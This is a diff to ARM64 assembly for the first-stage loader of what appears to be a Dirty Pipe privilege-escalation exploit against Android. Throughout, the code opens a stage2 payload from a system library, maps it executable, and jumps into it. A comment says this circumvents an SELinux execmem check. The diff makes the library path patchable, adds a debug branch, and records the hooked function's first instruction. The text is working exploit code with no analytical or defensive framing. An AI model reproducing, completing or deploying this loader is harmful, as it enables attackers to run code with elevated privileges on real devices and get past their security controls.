@@ -6,15 +6,20 @@
     .global stage1_filename
     .global stage1_data
     .global stage1_len
+    .global stage1_stage2_libname
+    .global stage1_first_inst_copy
     .data
+
 
 stage1_data:
 
 stage1_filename:
 L_filename:
     .asciz "/dev/.dirtypipe-0000"
+stage1_stage2_libname:
 lib:
-    .asciz "/system/lib/libldacBT_enc.so"
+    .space 64, 0
+    //.asciz "/system/lib/libldacBT_enc.so"
 
     .balign 4
 
@@ -81,7 +86,7 @@ stage1_start:
     // open and mmap stage2 payload from system lib. It circumvent execmem selinux check.
     mov     x0, 0
     adr     x1, lib
-    mov     x2, O_RDONLY
+    mov     x2, O_RDONLY | O_CLOEXEC
     mov     x3, xzr
     mov     x8, #SYS_openat
     svc     0
@@ -95,6 +100,13 @@ stage1_start:
     mov     x2, PROT_EXEC | PROT_READ
     movl    x1, 0xa000           // args[1] = 0x1000
     svc     0
+
+#if STAGE1_DEBUG == 1
+    // Debug
+    // It will log x0+1 as fault address.
+    add x0, x0, 1
+    br x0
+#endif
 
     // Launch stage2. Skip first instruction because we can't rewrite first byte.
     add     x0, x0, 4
@@ -112,6 +124,7 @@ return:
     ldp x0, x1, [sp], #16
 
     // First instruction of original function.
+stage1_first_inst_copy:
     stp     x29, x30, [sp, #-32]!
     // Back to original
     b       end
